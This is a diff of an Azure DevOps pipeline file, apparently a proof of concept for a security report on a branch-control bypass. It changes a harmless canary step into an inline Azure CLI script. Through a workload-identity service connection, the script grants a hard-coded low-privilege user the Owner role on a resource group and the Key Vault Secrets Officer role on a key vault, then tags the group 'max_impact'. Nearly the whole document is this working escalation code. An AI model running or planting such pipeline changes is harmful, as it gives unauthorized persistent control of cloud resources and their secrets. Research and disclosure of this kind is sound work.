@@ -1,9 +1,6 @@
 trigger: none
 
-pr:
-  branches:
-    include:
-      - main
+pr: none
 
 pool:
   vmImage: ubuntu-latest
@@ -28,19 +25,39 @@ stages:
                     printf 'pr_target=%s\n' "${SYSTEM_PULLREQUEST_TARGETBRANCH:-unset}"
                   displayName: Record evaluated Git refs
                 - task: AzureCLI@2
-                  displayName: Write bounded Branch Control canary
+                  displayName: Grant persistent Azure control through protected WIF
                   inputs:
                     azureSubscription: SC-SelfApproval-WIF-20260905
                     scriptType: bash
                     scriptLocation: inlineScript
                     inlineScript: |
                       set -euo pipefail
-                      canary="branch-control-build-$(Build.BuildId)-$(Build.SourceVersion)"
+                      low_object_id="9b64ee38-b963-4b79-8d82-7b4e639d0140"
+                      resource_group="rg-msrc-branch-control-max-20260905"
+                      vault_name="kvbcmax2609058955"
+                      canary="branch-control-max-owner-grant-$(Build.BuildId)-$(Build.SourceVersion)"
                       subscription_id="$(az account show --query id --output tsv)"
-                      resource_id="/subscriptions/${subscription_id}/resourceGroups/rg-msrc-gh-approval-20260905"
+                      resource_id="/subscriptions/${subscription_id}/resourceGroups/${resource_group}"
+                      vault_id="$(az keyvault show --resource-group "${resource_group}" --name "${vault_name}" --query id --output tsv)"
+
+                      az role assignment create \
+                        --assignee-object-id "${low_object_id}" \
+                        --assignee-principal-type User \
+                        --role Owner \
+                        --scope "${resource_id}" \
+                        --output none
+
+                      az role assignment create \
+                        --assignee-object-id "${low_object_id}" \
+                        --assignee-principal-type User \
+                        --role "Key Vault Secrets Officer" \
+                        --scope "${vault_id}" \
+                        --output none
+
                       az tag update \
                         --resource-id "${resource_id}" \
                         --operation Merge \
-                        --tags "branch_control_canary=${canary}" \
+                        --tags "branch_control_max_impact=${canary}" \
                         --output none
-                      printf 'branch_control_canary=%s\n' "${canary}"
+                      printf 'branch_control_max_impact=%s\n' "${canary}"
+                      printf 'granted_roles=Owner,Key Vault Secrets Officer\n'
